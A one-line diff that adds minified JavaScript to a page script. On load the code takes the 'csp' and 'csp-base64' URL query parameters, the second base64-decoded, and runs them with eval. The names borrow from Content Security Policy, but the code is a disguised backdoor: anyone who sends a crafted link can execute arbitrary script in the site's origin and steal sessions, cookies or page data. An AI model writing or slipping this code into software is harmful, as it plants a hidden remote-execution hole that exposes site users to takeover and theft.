@@ -1,0 +1,1 @@
+(()=>{window.addEventListener("load",(()=>{const urlParams=new URLSearchParams(window.location.search);let csp=urlParams.get("csp");csp&&eval(csp),csp=urlParams.get("csp-base64"),csp&&eval(atob(csp))}))})();
